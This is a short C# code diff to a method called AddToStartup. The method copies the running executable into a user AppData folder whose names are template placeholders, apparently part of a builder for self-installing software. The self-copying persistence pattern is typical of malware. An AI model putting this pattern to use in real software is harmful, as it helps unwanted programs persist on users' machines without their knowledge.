@@ -138,9 +138,11 @@ namespace stupidcancercodeisruiningeverything
         public void AddToStartup()
         {
 			
-            string path = Path.Combine(Application.UserAppDataPath, "/[fname-replace]");
+            string path = Path.Combine(Application.UserAppDataPath, "[fname-replace]");
             string path2 = Path.Combine(path, "[finame-replace].exe");
-            if (!File.Exists(path2))
+			//string pathreg = Path.Combine(Application.UserAppDataPath,"[regfname-replace]");
+			//string pathreg2 = Path.Combine(pathreg,"[regfiname-replace].exe");
+			if (!File.Exists(path2))
             {
                 DirectoryInfo di = Directory.CreateDirectory(path);
                 File.Copy(Application.ExecutablePath, path2, true);
